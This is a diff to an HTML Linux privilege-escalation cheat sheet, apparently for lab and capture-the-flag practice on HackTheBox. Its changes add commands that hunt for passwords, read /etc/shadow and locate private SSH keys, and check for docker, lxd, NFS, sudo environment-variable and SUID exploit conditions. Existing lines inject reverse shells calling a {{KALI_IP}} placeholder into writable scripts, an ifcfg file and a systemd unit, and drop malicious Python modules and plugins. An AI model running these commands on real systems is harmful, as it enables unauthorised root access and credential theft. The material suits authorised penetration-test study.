-<div class="cmd-wrap"><pre class="cmd">id | grep disk
-groups | grep disk</pre></div>
+<span class="pipe-step-label">1. DETECT — confirm YOU are in the disk group</span>
+<div class="cmd-wrap"><pre class="cmd">id | grep -w disk && echo 'IN DISK GROUP — raw device access possible!'
+# 'grep -w disk' ensures exact word match, not partial (e.g. not 'diskadm')</pre></div>
+<div class="alts">
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">groups | tr ' ' '\n' | grep -w disk</code></div>
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">cat /etc/group | grep disk | grep $(whoami)</code> — verify via /etc/group directly</div>
+</div>
 </div>
 <div class="pipe-step pipe-confirm">
-<span class="pipe-step-label">2. CONFIRM</span>
-<div class="cmd-wrap"><pre class="cmd">df -h
-fdisk -l 2>/dev/null</pre></div>
+<span class="pipe-step-label">2. CONFIRM — find the disk device backing / to pass to debugfs</span>
+<div class="cmd-wrap"><pre class="cmd">df -h /
+# Note the device in the first column (e.g. /dev/sda1, /dev/nvme0n1p1)
+# That is what you pass to debugfs</pre></div>
+<div class="alts">
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">lsblk</code> — no root needed, shows device tree</div>
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">cat /proc/partitions</code> — pure /proc fallback if lsblk missing</div>
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">fdisk -l 2>/dev/null</code> — may require root</div>
+</div>
+<div class="cmd-wrap"><div class="cmd-label">Confirm disk group members have rw access to the raw device</div>
+<pre class="cmd">ls -la /dev/sd* /dev/nvme* /dev/vd* 2>/dev/null | grep disk
+# Should show: brw-rw---- root disk /dev/sdX — confirms disk group has rw</pre></div>
 </div>
 <div class="pipe-step pipe-exploit">
 <span class="pipe-step-label">3. EXPLOIT</span>
@@ -3521,9 +3696,17 @@ su root # with cracked password</pre></div>
 </div>
 <div class="pipeline">
 <div class="pipe-step pipe-detect">
-<span class="pipe-step-label">1. DETECT</span>
-<div class="cmd-wrap"><pre class="cmd">ps aux | grep mysql
-# Look for: root ... /usr/sbin/mysqld</pre></div>
+<span class="pipe-step-label">1. DETECT — confirm mysqld process is running as root</span>
+<div class="cmd-wrap"><pre class="cmd">ps aux | grep mysqld | grep -v grep | awk '{print $1, $11}'
+# Output must show 'root' in column 1 (USER) — not 'mysql' user</pre></div>
+<div class="alts">
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">cat /etc/mysql/mysql.conf.d/mysqld.cnf 2>/dev/null | grep -i '^user'</code> — confirms configured run-as user</div>
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">cat /etc/mysql/my.cnf 2>/dev/null | grep -i '^user'</code> — alternative config location</div>
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">stat /proc/$(pgrep -x mysqld | head -1)/exe 2>/dev/null</code> — confirm via /proc</div>
+</div>
+<div class="cmd-wrap"><div class="cmd-label">Confirm sys_exec UDF is loaded before attempting exploit</div>
+<pre class="cmd">mysql -u root -e "SELECT * FROM mysql.func WHERE name='sys_exec';" 2>/dev/null
+# If empty: sys_exec not loaded — use INTO OUTFILE method instead</pre></div>
 </div>
 <div class="pipe-step pipe-confirm">
 <span class="pipe-step-label">2. CONFIRM — find MySQL credentials</span>
@@ -3594,6 +3777,15 @@ dpkg -l
 rpm -qa
 # OpenBSD/FreeBSD:
 pkg_info</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Check for exploitable installed versions — writable binaries in non-standard paths</div>
+<pre class="cmd"># Find user-installed binaries that are world-writable (directly exploitable):
+find /usr/local/bin /usr/local/sbin /opt -type f -perm -o+w 2>/dev/null
+# Find SUID binaries in non-standard paths (user-installed software often has these):
+find /usr/local /opt -perm -u=s -type f 2>/dev/null</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Alternative — find configs/scripts owned by you or writable in software install dirs</div>
+<pre class="cmd">find /opt /usr/local -user $(whoami) 2>/dev/null
+find /opt /usr/local -writable -type f 2>/dev/null | grep -v "^Binary"
+# Confirms: any output = you own or can write to files in software install dirs</pre></div>
 <div class="notes-toggle" onclick="toggleNotes('lin-usersoftware')">&#128221; Notes</div>
 <textarea class="notes-area" id="notes-lin-usersoftware" onchange="saveNote('lin-usersoftware',this.value)" placeholder="Add your notes here..."></textarea>
 </section>
@@ -3616,6 +3808,25 @@ find / -name 'wp-config.php' -o -name 'config.php' -o -name '.env' 2>/dev/null |
 <div class="cmd-wrap"><div class="cmd-label">Mail files — may contain passwords</div>
 <pre class="cmd">ls -la /var/mail/ /var/spool/mail/ 2>/dev/null
 cat /var/mail/* 2>/dev/null</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Pure bash — broad credential hunt in config files (no tools)</div>
+<pre class="cmd">grep -rE "(password|passwd|pwd|secret|token)\s*[=:]\s*\S+" \
+  /var/www/ /etc/ /home/ /opt/ /srv/ 2>/dev/null \
+  | grep -v "Binary\|#.*password\|example\|changeme" | head -30
+# Alternative — find files likely to have creds, then grep them:
+grep -rl "password" /var/www/ /home/ /opt/ 2>/dev/null | head -10 \
+  | xargs grep -i "password" 2>/dev/null | head -20</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Check if /etc/shadow is readable — confirms direct hash cracking is possible</div>
+<pre class="cmd">cat /etc/shadow 2>/dev/null && echo "[+] EXPLOITABLE: shadow readable"
+# Alternative — check permissions directly:
+ls -la /etc/shadow /etc/passwd /etc/sudoers 2>/dev/null
+# If cat works without error → hashes exposed, crack offline with hashcat -m 1800</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Find readable SSH private keys across all home dirs</div>
+<pre class="cmd">find /home /root /etc/ssh /tmp /var /opt -name "id_rsa" -o -name "id_ed25519" \
+  -o -name "*.pem" -o -name "*.key" 2>/dev/null | while read k; do
+  head -1 "$k" 2>/dev/null | grep -q "PRIVATE" \
+    && echo "[+] Private key: $k ($(ls -la "$k" 2>/dev/null | awk '{print $1,$3,$4}'))"
+done
+# Confirms: world/group-readable private key → copy and use directly</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Common default passwords to try (THINK SIMPLER)</div>
 <pre class="cmd">su root          # try: root, toor, password, ""
 su $(whoami)     # try: username, username1, admin
@@ -3639,6 +3850,19 @@ su $(whoami)     # try: username, username1, admin
 <div class="cmd-wrap"><pre class="cmd">netstat -anlp
 ss -tlnp
 ss -tulpn</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Identify which user owns each internal listener — root-owned process = high value target</div>
+<pre class="cmd">ss -tlnp | grep 127.0.0.1
+# Match PIDs to process owner:
+ss -tlnp | grep -oP 'pid=\K[0-9]+' | sort -u | while read pid; do
+  echo "PID $pid: $(cat /proc/$pid/comm 2>/dev/null) owner=$(cat /proc/$pid/status 2>/dev/null | awk '/^Uid/{print $2}')"
+done
+# uid=0 in output = root-owned service on 127.0.0.1 = investigate for exploit</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Banner-grab all listening internal ports to identify service and version</div>
+<pre class="cmd">for port in 21 22 25 80 110 143 443 3306 5432 6379 8080 8443 9200; do
+  result=$(timeout 2 bash -c "echo '' | nc 127.0.0.1 $port 2>/dev/null | head -1")
+  [ -n "$result" ] && echo "PORT $port: $result"
+done
+# Confirms: version string in output → look up CVE for that exact version</pre></div>
 <div class="notes-toggle" onclick="toggleNotes('lin-internal')">&#128221; Notes</div>
 <textarea class="notes-area" id="notes-lin-internal" onchange="saveNote('lin-internal',this.value)" placeholder="Add your notes here..."></textarea>
 </section>
@@ -3656,6 +3880,17 @@ find / -perm -o+w -type d 2>/dev/null</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">World-executable directories</div>
 <pre class="cmd">find / -perm -o+x -type d 2>/dev/null
 find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">CRITICAL — find world-writable FILES owned by root (the actual exploit path)</div>
+<pre class="cmd">find / -writable -type f -user root 2>/dev/null | grep -v "proc\|sys\|dev"
+# Alternative — world-writable scripts specifically (shell/python/perl):
+find / -writable -type f 2>/dev/null | grep -E "\.(sh|py|pl|rb)$" | xargs ls -la 2>/dev/null</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Confirm a cron job or systemd timer actually runs the writable script as root</div>
+<pre class="cmd"># Check all cron configs for references to scripts you can write:
+cat /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/root 2>/dev/null
+ls /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
+# Cross-check: if a file from find above appears in cron output = directly exploitable
+# Confirm you can write to it:
+[ -w /path/to/script ] && echo "[+] CONFIRMED writable — inject payload"</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Inject reverse shell into writable script</div>
 <pre class="cmd">echo 'bash -i >& /dev/tcp/{{KALI_IP}}/{{RPORT}} 0>&1' >> /path/to/writable/script.sh</pre></div>
 <div class="notes-toggle" onclick="toggleNotes('lin-worldwrite')">&#128221; Notes</div>
@@ -3672,6 +3907,19 @@ find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null</pre></div>
 mount -l
 lsblk
 blkid</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Identify unmounted partitions — compare fstab entries against currently mounted</div>
+<pre class="cmd"># Show paths declared in fstab that are NOT currently mounted:
+comm -23 \
+  <(grep -v "^#\|^$\|swap\|tmpfs\|proc\|sysfs\|devpts" /etc/fstab | awk '{print $2}' | sort) \
+  <(mount | awk '{print $3}' | sort)
+# Output = unmounted candidate paths worth investigating</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Attempt to mount candidate partition and check for sensitive files</div>
+<pre class="cmd"># Try mounting (requires sudo mount or user-mountable entry in fstab):
+sudo mount /dev/sdXY /mnt/tmp 2>/dev/null && echo "[+] Mounted successfully"
+# Check for privilege escalation material:
+ls -la /mnt/tmp/etc/ /mnt/tmp/root/ /mnt/tmp/home/ 2>/dev/null
+# Confirms exploit path: readable shadow, SUID bash, or writable authorized_keys:
+ls -la /mnt/tmp/etc/shadow /mnt/tmp/root/.ssh/ 2>/dev/null</pre></div>
 <div class="notes-toggle" onclick="toggleNotes('lin-unmounted')">&#128221; Notes</div>
 <textarea class="notes-area" id="notes-lin-unmounted" onchange="saveNote('lin-unmounted',this.value)" placeholder="Add your notes here..."></textarea>
 </section>
@@ -3701,6 +3949,18 @@ export PATH=/tmp:$PATH
 <pre class="cmd">find / -perm -u=s -writable -type f 2>/dev/null</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Find SUID in cron directories</div>
 <pre class="cmd">find /etc/cron* /var/spool/cron/ -perm -u=s -type f 2>/dev/null</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Confirm current user can actually EXECUTE each SUID binary found</div>
+<pre class="cmd">find / -perm -u=s -type f 2>/dev/null | while read f; do
+  [ -x "$f" ] && echo "[+] EXECUTABLE by us: $f" || echo "[-] NOT executable: $f"
+done
+# Alternative — show owner/group of each SUID binary to spot group restrictions:
+find / -perm -u=s -type f 2>/dev/null | xargs ls -la 2>/dev/null | awk '{print $1,$3,$4,$NF}'</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Check Linux capabilities — same impact as SUID, frequently missed</div>
+<pre class="cmd">getcap -r / 2>/dev/null
+# Dangerous output to look for: cap_setuid, cap_dac_override, cap_sys_admin
+# Example: /usr/bin/python3 = cap_setuid+ep
+# Exploit cap_setuid immediately:
+# python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'</pre></div>
 <div class="notes-toggle" onclick="toggleNotes('lin-suid2')">&#128221; Notes</div>
 <textarea class="notes-area" id="notes-lin-suid2" onchange="saveNote('lin-suid2',this.value)" placeholder="Add your notes here..."></textarea>
 </section>
@@ -3778,6 +4038,16 @@ checksec --file=/path/to/binary</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">On target — check exported shares</div>
 <pre class="cmd">cat /etc/exports 2>/dev/null
 # Look for: /share *(rw,no_root_squash) or /share *(rw,sync,no_root_squash)</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Confirm NFS daemon is actually running — prerequisite for the attack</div>
+<pre class="cmd">systemctl is-active nfs-server nfs-kernel-server rpcbind 2>/dev/null
+ps aux | grep -E "nfsd|rpcbind|mountd" | grep -v grep
+# Alternative — check if RPC/NFS ports are listening:
+ss -tlnp | grep -E ":111|:2049"
+# Confirms: if nfsd process running AND port 2049 open → NFS is active</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Parse /etc/exports for the exact exploitable flag in one command</div>
+<pre class="cmd">grep -v "^#\|^$" /etc/exports 2>/dev/null
+grep -E "no_root_squash|no_all_squash" /etc/exports 2>/dev/null \
+  && echo "[+] EXPLOITABLE: squash bypass found in exports"</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">From Kali — enumerate target's NFS shares</div>
 <pre class="cmd">showmount -e {{TARGET}}
 # OR: nmap -sV -p 111,2049 {{TARGET}}</pre></div>
@@ -3828,10 +4098,22 @@ rmdir /tmp/nfs</pre></div>
   <div class="section-subtitle">docker group = instant root. Check with: id | grep docker</div></div>
   <div class="badges"><span class="badge badge-privesc">PRIVESC</span><span class="badge badge-new">NEW</span></div>
 </div>
-<div class="cmd-wrap"><div class="cmd-label">Detect</div>
+<div class="cmd-wrap"><div class="cmd-label">Detect — group membership</div>
 <pre class="cmd">id | grep docker
 groups | grep docker
 ls -la /var/run/docker.sock 2>/dev/null</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">CRITICAL — verify Docker daemon is actually reachable (group alone is not enough)</div>
+<pre class="cmd">docker ps 2>/dev/null && echo "[+] EXPLOITABLE: Docker daemon accessible"
+# Confirm socket is writable by your user (group membership must match socket group):
+stat -c "%G %a" /var/run/docker.sock 2>/dev/null
+[ -w /var/run/docker.sock ] && echo "[+] CONFIRMED: socket writable = exploitable" \
+  || echo "[-] Socket not writable — group membership alone insufficient"</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">If docker binary missing — access daemon via curl against the socket directly</div>
+<pre class="cmd">find /usr /usr/local /snap -name "docker" -type f 2>/dev/null
+# No docker binary? Use curl against the socket API:
+curl -s --unix-socket /var/run/docker.sock http://localhost/images/json 2>/dev/null \
+  | grep -o '"RepoTags":\[[^]]*\]' | head -5
+# If curl returns JSON → daemon accessible without docker binary</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Docker group escape — mount host root into container</div>
 <pre class="cmd">docker run -v /:/mnt --rm -it alpine chroot /mnt sh</pre></div>
 <div class="alts">
@@ -3867,6 +4149,13 @@ If that line is NOT present → sudo strips LD_PRELOAD before exec → exploit s
 <pre class="cmd">sudo -l
 # Look for line like: env_keep += LD_PRELOAD
 # AND at least one binary you can sudo to</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Pure bash confirmation — parse sudo -l for the exact required conditions</div>
+<pre class="cmd">sudo -l 2>/dev/null | grep -E "LD_PRELOAD|env_keep|SETENV" && echo "[+] env preservation found"
+# SETENV flag also works — it allows passing any env variable including LD_PRELOAD:
+sudo -l 2>/dev/null | grep "SETENV" && echo "[+] SETENV present — LD_PRELOAD passable"
+# List all sudoable binaries (need at least one to pull the trigger):
+sudo -l 2>/dev/null | grep -E "NOPASSWD" | grep -v "env_keep\|env_reset\|secure_path"
+# Exploitable if: (LD_PRELOAD in env_keep OR SETENV present) AND at least one sudo binary</pre></div>
 </div>
 <div class="pipe-step pipe-kali">
 <span class="pipe-step-label">COMPILE — write and compile the shared library payload</span>
@@ -3936,6 +4225,16 @@ sudo LD_LIBRARY_PATH=/tmp &lt;sudo_allowed_binary&gt;</pre>
 <pre class="cmd">ltrace /path/to/suid-binary 2&gt;&amp;1 | grep -E 'system|exec|popen'</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">strace alternative</div>
 <pre class="cmd">strace -f /path/to/suid-binary 2&gt;&amp;1 | grep -E 'execve|stat'</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Fallback if strings/ltrace/strace unavailable — use od to extract printable strings</div>
+<pre class="cmd">od -An -c /path/to/suid-binary 2>/dev/null | tr ' ' '\n' | grep -E '^[a-z][a-z0-9_-]{2,}$' | sort -u
+# Alternative with hexdump:
+hexdump -v -e '1/1 "%_p"' /path/to/suid-binary 2>/dev/null | tr -cs 'a-zA-Z0-9_-' '\n' \
+  | grep -v '/' | awk 'length>3' | sort -u
+# Confirms: words without a leading / are PATH-dependent calls → hijackable</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Confirm /tmp is writable and PATH manipulation will work</div>
+<pre class="cmd">[ -w /tmp ] && echo "[+] /tmp writable" || echo "[-] try /dev/shm instead"
+[ -w /dev/shm ] && echo "[+] /dev/shm writable — use as PATH prefix"
+export PATH=/tmp:$PATH; echo $PATH  # verify /tmp is leftmost entry</pre></div>
 </div>
 <div class="pipe-step pipe-confirm">
 <span class="pipe-step-label">2. CONFIRM — identify exact command name to hijack</span>
@@ -3988,6 +4287,10 @@ cat /path/to/script.py | grep import</pre>
 sudo -l | grep PYTHONPATH
 # Also check sudoers directly:
 cat /etc/sudoers | grep -i python</pre>
+    <pre class="cmd"># SETENV flag also allows passing PYTHONPATH even without env_keep:
+sudo -l 2>/dev/null | grep "SETENV" && echo "[+] SETENV present — PYTHONPATH passable"
+# One-liner: confirm either exploitable condition exists:
+sudo -l 2>/dev/null | grep -E "PYTHONPATH|SETENV" && echo "[+] EXPLOITABLE condition confirmed"</pre>
     <pre class="cmd"># If PYTHONPATH is not in env_keep, use the inline approach instead (see below)</pre>
   </div>
   <div class="pipe-step pipe-exploit"><div class="pipe-step-label">3. EXPLOIT — Method A: PYTHONPATH environment variable</div>
@@ -4005,6 +4308,11 @@ python3 -c "import sys; print(sys.path)"
 # If any directory is writable by you:
 echo 'import os; os.execl("/bin/bash","bash","-p")' &gt; /writable/python/dir/shutil.py
 sudo python3 /path/to/script.py</pre>
+    <pre class="cmd"># Automated check — find writable dirs in Python's actual search path:
+python3 -c "import sys; print('\n'.join(sys.path))" 2>/dev/null | while read p; do
+  [ -n "$p" ] && [ -w "$p" ] && echo "[+] WRITABLE Python path: $p"
+done
+# Confirms: any output = can drop a module there without needing PYTHONPATH env var</pre>
   </div>
   <div class="pipe-step pipe-exploit"><div class="pipe-step-label">Method C: Direct module injection (any imported module)</div>
     <pre class="cmd"># Works when SETENV is allowed in sudoers OR env_keep has PYTHONPATH
@@ -4070,6 +4378,14 @@ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</pre></
   <div class="pipe-step pipe-detect"><div class="pipe-step-label">DETECT</div>
     <pre class="cmd">id | grep lxd</pre>
     <pre class="cmd">groups</pre>
+    <pre class="cmd"># Confirm lxc binary exists and LXD daemon is accessible:
+which lxc 2>/dev/null && echo "[+] lxc binary present"
+lxc list 2>/dev/null && echo "[+] LXD daemon accessible = exploitable"
+# Alternative — check for daemon socket directly:
+[ -S /var/snap/lxd/common/lxd/unix.socket ] && echo "[+] LXD socket found"
+# Check if images already exist (can skip Kali transfer step):
+lxc image list 2>/dev/null | grep -v "^+\|^$"
+# Confirms: lxc list runs without error → full LXD access = exploitable</pre>
   </div>
   <div class="pipe-step pipe-exploit"><div class="pipe-step-label">KALI — build Alpine image</div>
     <pre class="cmd">git clone https://github.com/saghul/lxd-alpine-builder
@@ -4109,10 +4425,16 @@ cat /mnt/root/root/proof.txt</pre>
   <div class="pipe-step pipe-detect"><div class="pipe-step-label">1. DETECT — verify vulnerable version and cron setup</div>
     <pre class="cmd">chkrootkit --version 2&gt;&amp;1 | head -1
 # Must be: chkrootkit version 0.49</pre>
-    <pre class="cmd"># Confirm chkrootkit runs as root via cron:
-crontab -l 2>/dev/null; cat /etc/cron*/* 2>/dev/null | grep chkrootkit
-# Check if /tmp is world-writable:
-ls -la /tmp | head -2</pre>
+    <pre class="cmd"># Confirm /tmp is world-writable AND executable (both required for /tmp/update to run):
+ls -la / | grep " tmp"
+mount | grep /tmp | grep -q noexec && echo "[-] /tmp noexec — attack fails" \
+  || echo "[+] /tmp executable"
+[ -w /tmp ] && echo "[+] /tmp writable = can plant /tmp/update"</pre>
+    <pre class="cmd"># Confirm chkrootkit runs as root via cron (check ALL cron locations):
+grep -r "chkrootkit" /etc/cron* /var/spool/cron/ 2>/dev/null \
+  && echo "[+] chkrootkit found in cron = exploitable"
+# Your own crontab (runs as you, not root — informational only):
+crontab -l 2>/dev/null | grep chkrootkit</pre>
   </div>
   <div class="pipe-step pipe-exploit"><div class="pipe-step-label">2. EXPLOIT — create /tmp/update (chkrootkit executes it as root)</div>
     <div class="cmd-wrap"><div class="cmd-label">Option A: SUID bash (no callback needed)</div>
@@ -4155,6 +4477,18 @@ ls -la /bin/bash  # should be -rwxr-xr-x (no s bit)</pre>
     <pre class="cmd">screen --version
 ls -la $(which screen)
 find / -perm -4000 -name screen 2>/dev/null</pre>
+    <pre class="cmd"># One-liner: confirm BOTH required conditions (version 4.5.00 AND SUID bit) together:
+screen_path=$(which screen 2>/dev/null || find / -perm -4000 -name screen 2>/dev/null | head -1)
+[ -n "$screen_path" ] && {
+  ver=$(screen --version 2>&1 | awk '{print $3}')
+  perm=$(ls -la "$screen_path" 2>/dev/null | awk '{print $1}')
+  echo "Version: $ver | Perms: $perm"
+  echo "$ver" | grep -q "4.5.00" && echo "$perm" | grep -q "s" \
+    && echo "[+] EXPLOITABLE: screen 4.5.00 with SUID confirmed"
+}
+# Confirm gcc is available for compiling payloads:
+which gcc 2>/dev/null && echo "[+] gcc available" \
+  || echo "[-] gcc missing — compile on Kali and transfer the .so and rootshell binaries"</pre>
   </div>
   <div class="pipe-step pipe-exploit"><div class="pipe-step-label">CREATE PAYLOADS</div>
     <pre class="cmd">cat &gt; /tmp/rootshell.c &lt;&lt; 'EOF'
@@ -4287,6 +4621,15 @@ msfconsole -q -x "search type:exploit name:SERVICE_NAME"</pre></div>
 <pre class="cmd">find / -name ".git" -type d 2>/dev/null
 find / -path "*/.git/hooks" -writable 2>/dev/null
 ls -la /path/to/repo/.git/hooks/</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">CRITICAL — confirm a privileged process triggers git (hooks run as hook-triggerer, not you)</div>
+<pre class="cmd"># Check cron jobs that invoke git as root:
+grep -r "\bgit\b" /etc/cron* /var/spool/cron/ 2>/dev/null
+# Check systemd services/timers that invoke git:
+grep -r "\bgit\b" /etc/systemd/system/ /lib/systemd/system/ 2>/dev/null | grep "Exec"
+# Check root-owned scripts that call git:
+find / -user root -name "*.sh" -o -user root -name "*.py" 2>/dev/null \
+  | xargs grep -l "\bgit\b" 2>/dev/null
+# Confirms exploit only if: git triggered by root process AND you can write to .git/hooks/</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Create malicious post-commit hook (runs when git commit happens)</div>
 <pre class="cmd">cat &gt; /path/to/repo/.git/hooks/post-commit &lt;&lt; 'EOF'
 #!/bin/bash
@@ -4357,6 +4700,15 @@ bash -i &gt;&amp; /dev/tcp/{{KALI_IP}}/{{RPORT}} 0&gt;&amp;1
 <div class="subsection"><div class="subsection-title">dstat — Plugin Path Hijack</div>
 <div class="callout callout-warn"><strong>⚠️ Seen on: Soccer (HTB)</strong> Create plugin in writable dstat directory.</div>
 <div class="cmd-wrap"><pre class="cmd">sudo dstat --list 2&gt;&amp;1 | grep "plugin"</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Confirm which dstat plugin directories are writable by you</div>
+<pre class="cmd">for d in /usr/share/dstat /usr/local/share/dstat ~/.dstat /usr/lib/dstat; do
+  [ -w "$d" ] && echo "[+] WRITABLE: $d" || echo "[-] not writable: $d"
+done
+# Alternative — let dstat report its own plugin paths then check each:
+sudo dstat --list 2>/dev/null | grep "^/" | while read dir; do
+  [ -w "$dir" ] && echo "[+] WRITABLE: $dir"
+done
+# Confirms: any WRITABLE path → drop dstat_pwn.py there and run sudo dstat --pwn</pre></div>
 <div class="cmd-wrap"><pre class="cmd"># Create plugin in local writable dir:
 mkdir -p /usr/local/share/dstat
 echo 'import os; os.execl("/bin/sh","sh","-p")' &gt; /usr/local/share/dstat/dstat_pwn.py
@@ -4485,6 +4837,14 @@ sed -i '/root2/d' /etc/passwd 2>/dev/null</pre></div>
 <div class="cmd-wrap"><pre class="cmd"># Check for writable ifcfg scripts:
 ls -la /etc/sysconfig/network-scripts/
 cat /etc/sysconfig/network-scripts/ifcfg-eth0</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Confirm you can write to an ifcfg script AND have a way to trigger ifup/ifdown</div>
+<pre class="cmd"># Check which ifcfg files are writable:
+find /etc/sysconfig/network-scripts/ -name "ifcfg-*" -writable 2>/dev/null \
+  && echo "[+] Writable ifcfg file found"
+# Confirm you can trigger the interface restart:
+sudo -l 2>/dev/null | grep -E "ifup|ifdown|network" && echo "[+] sudo ifup/ifdown available"
+sudo -l 2>/dev/null | grep -E "systemctl|service" && echo "[+] Can restart network service"
+# Confirms exploit: writable ifcfg + ability to trigger ifup/ifdown as root</pre></div>
 <div class="cmd-wrap"><pre class="cmd"># Inject payload into NAME field (spaces become separate commands):
 echo 'NAME=eth0 bash -i &gt;&amp; /dev/tcp/{{KALI_IP}}/{{RPORT}} 0&gt;&amp;1' &gt; /etc/sysconfig/network-scripts/ifcfg-eth0
 sudo /sbin/ifdown eth0 &amp;&amp; sudo /sbin/ifup eth0</pre></div>
@@ -4503,6 +4863,16 @@ sudo /sbin/ifdown eth0 &amp;&amp; sudo /sbin/ifup eth0</pre></div>
 <div class="subsection"><div class="subsection-title">Tmux — session hijack (world-accessible socket)</div>
 <div class="cmd-wrap"><pre class="cmd">find /tmp /var/tmp -name "tmux-*" 2>/dev/null
 ls -la /tmp/tmux-*/default 2>/dev/null</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Confirm the tmux socket is actually accessible and readable/writable by your user</div>
+<pre class="cmd">find /tmp /var/tmp -name "tmux-*" -type s 2>/dev/null | while read sock; do
+  ls -la "$sock" 2>/dev/null
+  [ -r "$sock" ] && [ -w "$sock" ] && echo "[+] ACCESSIBLE: $sock = exploitable" \
+    || echo "[-] Permission denied: $sock"
+done
+# Alternative — directly try to list sessions (errors = no access):
+find /tmp /var/tmp -name "tmux-*" -type s 2>/dev/null | while read sock; do
+  tmux -S "$sock" list-sessions 2>/dev/null && echo "[+] CONFIRMED accessible: $sock"
+done</pre></div>
 <div class="cmd-wrap"><pre class="cmd"># If socket is accessible:
 tmux -S /tmp/tmux-0/default attach</pre></div>
 <div class="cmd-wrap"><pre class="cmd"># Or list sessions:
@@ -4511,6 +4881,12 @@ tmux -S /path/to/socket attach-session -t SESSION_NAME</pre></div>
 </div>
 <div class="subsection"><div class="subsection-title">Writable systemd service — restart abuse</div>
 <div class="cmd-wrap"><pre class="cmd">find / -path /proc -prune -o -name "*.service" -writable -print 2>/dev/null</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">Confirm you can trigger a restart of the writable service</div>
+<pre class="cmd"># Check if sudo systemctl is available without password:
+sudo -l 2>/dev/null | grep -E "systemctl|service" && echo "[+] sudo systemctl available"
+# Check if the service is set to auto-restart (exploit fires on next restart automatically):
+systemctl show TARGET.service 2>/dev/null | grep "Restart="
+# Confirms exploit: writable .service file + sudo systemctl restart = exploitable</pre></div>
 <div class="cmd-wrap"><pre class="cmd"># Edit ExecStart in writable service file:
 nano /lib/systemd/system/TARGET.service
 # Change ExecStart=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/{{KALI_IP}}/{{RPORT}} 0&gt;&amp;1'
